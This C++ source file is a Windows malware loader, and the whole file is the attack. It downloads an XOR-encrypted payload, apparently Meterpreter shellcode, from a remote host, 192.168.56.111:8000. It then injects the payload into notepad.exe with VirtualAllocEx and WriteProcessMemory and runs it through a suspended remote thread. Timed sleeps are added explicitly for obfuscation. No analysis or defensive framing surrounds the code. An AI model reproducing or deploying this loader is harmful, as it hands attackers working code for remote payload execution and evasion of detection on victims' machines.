#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <wininet.h>
#include <thread>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")
#pragma comment(lib, "wininet.lib")

void xor_encrypt_decrypt(uint8_t* data, size_t data_len, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

DWORD locateProcess(const wchar_t* targetProcName) {
    if (!targetProcName) return 0;

    int processID = 0;
    // snapshot of all processes in the system
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // initializing process entry structure
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    BOOL operationResult = Process32First(processSnapshot, &processEntry);


    // retrieve information about the processes
    while (operationResult) {
        // if we find the process: return process ID
        if (_wcsicmp(targetProcName, processEntry.szExeFile) == 0) {

            processID = processEntry.th32ProcessID;
            break;
        }
        operationResult = Process32Next(processSnapshot, &processEntry);
    }
    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(processSnapshot);
    return processID;
}

int main() {
    const wchar_t* target = L"notepad.exe"; //target process

    // Locate PID once
    DWORD pid = locateProcess(target);
   
    //process HANDLE, open it properly
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

   //Open internet session and get the file handle
    HINTERNET hInternet = InternetOpen(L"Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, L"http://192.168.56.111:8000/encrypted_meter.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile) {

        DWORD bytesRead;
        BYTE buffer[203850];

        InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
        // Allocate memory for the payload
        LPVOID exec = VirtualAllocEx(hProc, NULL, sizeof(buffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        //decrypt shellcode
        const char key[] = "secret";
        xor_encrypt_decrypt(buffer, sizeof(buffer), key);
        Sleep(3000);
        SIZE_T bytesWritten;
        WriteProcessMemory(hProc, exec, buffer, sizeof(buffer), &bytesWritten);
                
        //adjust the sleep timing for obfuscation
        Sleep(5000);
        //create a remote thread in suspended state for obfuscation
        HANDLE remote_thread = CreateRemoteThreadEx(hProc, NULL, 0, LPTHREAD_START_ROUTINE(exec), NULL, CREATE_SUSPENDED, NULL, NULL);

        //adjust the sleep timing for obfuscation
        Sleep(5000);
        ResumeThread(remote_thread);
    }
    InternetCloseHandle(hFile);

    InternetCloseHandle(hInternet);
    return 0;
}

